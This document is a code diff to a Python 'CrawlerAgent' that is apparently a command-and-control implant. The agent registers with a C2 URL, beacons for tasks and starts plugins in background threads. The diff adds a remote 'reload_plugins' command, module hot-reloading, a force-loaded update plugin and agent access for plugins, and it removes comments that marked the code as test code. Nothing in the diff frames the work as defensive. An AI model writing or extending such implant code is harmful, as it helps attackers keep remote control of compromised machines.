@@ -17,12 +17,12 @@ class CrawlerAgent:
         self.running_plugins: Dict[str, BasePlugin] = {}
         self.loaded_plugins: Dict[str, BasePlugin] = {}
         self.C2_URL = c2_url
-        self.BEACON_INTERVAL_SECONDS = 5  # Shorten for faster testing
+        self.BEACON_INTERVAL_SECONDS = 5
         self.CONFIG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
-        self.is_running = True # Flag for graceful shutdown
+        self.is_running = True
 
-        self._load_config()
         self._load_plugins()
+        self._load_config()
 
     def _load_config(self):
         if os.path.exists(self.CONFIG_FILE_PATH):
@@ -54,28 +54,39 @@ class CrawlerAgent:
             return False
 
     def _load_plugins(self):
+        """Scans the plugins directory and loads any valid plugins."""
+        self.loaded_plugins.clear() # Clear existing plugins before reloading
         plugins_package = 'crawler.implant.plugins'
         plugins_path = os.path.join(os.path.dirname(__file__), "plugins")
         for _, name, _ in pkgutil.iter_modules([plugins_path]):
-            if name != "base_plugin":
+            if name not in ["base_plugin", "update"]: # Don't try to reload the updater itself
                 try:
+                    # Invalidate caches to ensure we get the new version
+                    importlib.invalidate_caches()
                     module = importlib.import_module(f"{plugins_package}.{name}")
+                    importlib.reload(module) # Reload the module in case it was updated
                     for item_name in dir(module):
                         item = getattr(module, item_name)
                         if isinstance(item, type) and issubclass(item, BasePlugin) and item is not BasePlugin:
                             instance = item()
                             self.loaded_plugins[instance.get_name()] = instance
-                except Exception: pass
+                except Exception:
+                    pass
 
     def _handle_task(self, task: Dict):
         command = task.get('command')
         args = task.get('args', {})
         plugin_name = args.get('plugin_name')
 
-        if command == "start_plugin" and plugin_name in self.loaded_plugins and plugin_name not in self.running_plugins:
+        if command == "reload_plugins":
+            print("Reloading plugins...")
+            self._load_plugins()
+
+        elif command == "start_plugin" and plugin_name in self.loaded_plugins and plugin_name not in self.running_plugins:
             plugin = self.loaded_plugins[plugin_name]
             self.running_plugins[plugin_name] = plugin
-            thread = threading.Thread(target=plugin.start, args=(args,))
+            # Pass the agent instance itself to the plugin
+            thread = threading.Thread(target=plugin.start, args=(self, args))
             thread.daemon = True
             thread.start()
 
@@ -84,16 +95,19 @@ class CrawlerAgent:
             del self.running_plugins[plugin_name]
 
         elif command == "terminate":
-            print("Test: Terminate command received by agent.")
             for plugin in self.running_plugins.values():
                 plugin.stop()
-            self.is_running = False # Set flag to false for graceful exit
+            self.is_running = False
 
     def run(self):
         if not self.implant_id or not self.token:
             if not self._register_with_c2():
                 self.is_running = False
                 return
+
+        # Manually load the update plugin so it's always available
+        from .plugins.update import UpdatePlugin
+        self.loaded_plugins['update'] = UpdatePlugin()
 
         while self.is_running:
             try:
